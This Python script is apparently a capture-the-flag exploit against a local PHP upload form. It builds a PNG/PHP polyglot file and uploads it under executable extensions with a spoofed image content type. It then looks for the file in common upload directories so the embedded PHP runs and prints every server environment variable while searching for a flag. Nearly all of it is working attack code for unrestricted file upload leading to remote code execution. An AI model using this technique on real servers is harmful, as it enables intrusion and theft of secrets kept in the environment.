import requests
import io
import re
import zlib

# Target URL
base_url = "http://127.0.0.1:32818"
upload_url = f"{base_url}/index.php"

print("[+] Creating PNG/PHP polyglot file...")

# PNG signature (8 bytes)
png_signature = b'\x89PNG\r\n\x1a\n'

# IHDR chunk (image header - 1x1 pixel, 8-bit grayscale)
ihdr_data = b'\x00\x00\x00\x01'  # Width: 1
ihdr_data += b'\x00\x00\x00\x01'  # Height: 1
ihdr_data += b'\x08'  # Bit depth: 8
ihdr_data += b'\x00'  # Color type: grayscale
ihdr_data += b'\x00'  # Compression: deflate
ihdr_data += b'\x00'  # Filter: adaptive
ihdr_data += b'\x00'  # Interlace: none

# Calculate CRC for IHDR
ihdr_type = b'IHDR'
ihdr_crc = zlib.crc32(ihdr_type + ihdr_data) & 0xffffffff

ihdr_chunk = len(ihdr_data).to_bytes(4, 'big')
ihdr_chunk += ihdr_type
ihdr_chunk += ihdr_data
ihdr_chunk += ihdr_crc.to_bytes(4, 'big')

# IDAT chunk (image data - minimal for 1x1 grayscale)
idat_data = zlib.compress(b'\x00\x00')  # Filter none + pixel value
idat_type = b'IDAT'
idat_crc = zlib.crc32(idat_type + idat_data) & 0xffffffff

idat_chunk = len(idat_data).to_bytes(4, 'big')
idat_chunk += idat_type
idat_chunk += idat_data
idat_chunk += idat_crc.to_bytes(4, 'big')

# PHP payload - compact version to extract FLAG
php_code = b'<?php foreach(getenv() as $k=>$v){echo "$k=$v\\n";if(stripos($v,"FLAG")!==false)echo "***FLAG: $k=$v***\\n";} ?>'

# IEND chunk (end of PNG)
iend_type = b'IEND'
iend_crc = zlib.crc32(iend_type) & 0xffffffff
iend_chunk = b'\x00\x00\x00\x00'  # Length: 0
iend_chunk += iend_type
iend_chunk += iend_crc.to_bytes(4, 'big')

# Combine all parts
polyglot = png_signature + ihdr_chunk + idat_chunk + php_code + iend_chunk

print(f"[+] Polyglot created: {len(polyglot)} bytes")

# Try different filename extensions
extensions = ['.php', '.phtml', '.php5', '.png.php']

for ext in extensions:
    filename = f"shell{ext}"
    print(f"\n[+] Testing extension: {filename}")
    
    files = {'userfile': (filename, polyglot, 'image/png')}
    data = {'submit': 'Upload File'}
    
    try:
        resp = requests.post(upload_url, files=files, data=data, timeout=5)
        print(f"[+] Upload Status: {resp.status_code} | Length: {len(resp.content)}B")
        
        # Check response for upload path hint
        if 'upload' in resp.text.lower():
            print(f"[+] Response mentions 'upload'")
        
        # Try to access uploaded file
        for path in ['/upload/', '/uploads/', '/']:
            access_url = f"{base_url}{path}{filename}"
            try:
                r = requests.get(access_url, timeout=5)
                if r.status_code == 200:
                    print(f"\n[SUCCESS] File accessible at: {access_url}")
                    print(f"[+] Status: {r.status_code} | Length: {len(r.content)}B")
                    print(f"[+] Response:\n{r.text}")
                    
                    # Search for FLAG
                    flags = re.findall(r'FLAG\{[^}]+\}', r.text)
                    if flags:
                        for flag in flags:
                            print(f"\n[!!!] FLAG FOUND: {flag}")
            except:
                pass
                
    except Exception as e:
        print(f"[!] Error: {e}")

print("\n[+] Complete")

